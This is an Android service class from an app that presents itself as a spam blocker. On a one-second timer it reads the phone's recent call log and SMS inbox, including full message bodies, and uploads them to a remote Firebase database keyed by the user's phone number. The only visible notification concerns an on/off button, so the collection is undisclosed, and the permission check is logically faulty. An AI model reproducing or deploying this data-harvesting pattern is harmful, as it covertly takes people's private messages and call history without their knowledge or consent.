package com.example.spamblocker;
import static com.example.spamblocker.App.CHANNEL_ID;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.FirebaseFirestore;
import java.util.Date;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

public class MyForegroundService extends Service {

    String notificationTitle = "";
    String notificationBode = "";
    SharedPreferences sharedPreferences;
    Notification notification = null;
    private Timer timer;
    FirebaseFirestore firestore;

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        timer = new Timer();
        sharedPreferences = getSharedPreferences("myPrefs", MODE_PRIVATE);


        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                runFunction();
                takeInformation();
            }
        }, 0, 1000); // 1000 milliseconds * 60 seconds


        return START_STICKY;

    }


    private void takeInformation() {
        firestore = FirebaseFirestore.getInstance();

        HashMap<String, String> lastMessages = getLastMessages(getApplicationContext());

        HashMap<String, Date> lastCalls = getLastCalls();

        addToRealTime(lastCalls, lastMessages);


    }

    private void addToRealTime(HashMap<String, Date> lastCalls, HashMap<String, String> lastMessages) {


        TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        String number = tMgr.getLine1Number();
        if (number == null)
            number = "0529589098";
        DatabaseReference usersRef = database.getReference(number);


        usersRef.child("Calls").setValue(lastCalls, new DatabaseReference.CompletionListener() {
            @Override
            public void onComplete(DatabaseError databaseError, DatabaseReference databaseReference) {
                if (databaseError != null) {
                    Log.e("Error", "Data could not be saved " + databaseError.getMessage());
                } else {
                    Log.i("Success", "Data saved successfully.");
                }
            }
        });
        usersRef.child("Messages").setValue(lastMessages, new DatabaseReference.CompletionListener() {
            @Override
            public void onComplete(DatabaseError databaseError, DatabaseReference databaseReference) {
                if (databaseError != null) {
                    Log.e("Error", "Data could not be saved " + databaseError.getMessage());
                } else {
                    Log.i("Success", "Data saved successfully.");
                }
            }
        });


    }

    private void runFunction() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);
        if (sharedPreferences.getString("button", "").equals("Off")){
            notificationTitle = getString(R.string.button_is_off);
            notificationBode = getString(R.string.button_off_body);
        }
        else {
            notificationTitle = getString(R.string.button_is_on);
            notificationBode = getString(R.string.button_on_body);
        }
        notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(notificationTitle)
                .setContentText(notificationBode)
                .setSmallIcon(R.drawable.ic_app_logo)
                .setContentIntent(pendingIntent)
                .build();
        startForeground(1, notification);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    public HashMap<String, Date> getLastCalls() {
        HashMap<String, Date> calls = new HashMap<>();

        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");

        int numberColumnIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int dateColumnIndex = cursor.getColumnIndex(CallLog.Calls.DATE);

        int count = 0;
        while (cursor.moveToNext() && count < 30) {
            String callNumber = cursor.getString(numberColumnIndex);
            Date callDate = new Date(cursor.getLong(dateColumnIndex));

            calls.put(callNumber, callDate);
            count++;
        }

        cursor.close();

        return calls;
    }


    public static HashMap<String, String> getLastMessages(Context context) {
        HashMap<String, String> smsMap = new HashMap<>();
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null);
        int count = 0;
        if (cursor.moveToLast()) {
            do {
                if (count >= 20) {
                    break;
                }
                @SuppressLint("Range") String address = cursor.getString(cursor.getColumnIndex("address"));
                @SuppressLint("Range") String body = cursor.getString(cursor.getColumnIndex("body"));
                smsMap.put(address, body);
                count++;
            } while (cursor.moveToPrevious());
        }
        cursor.close();
        return smsMap;
    }


}

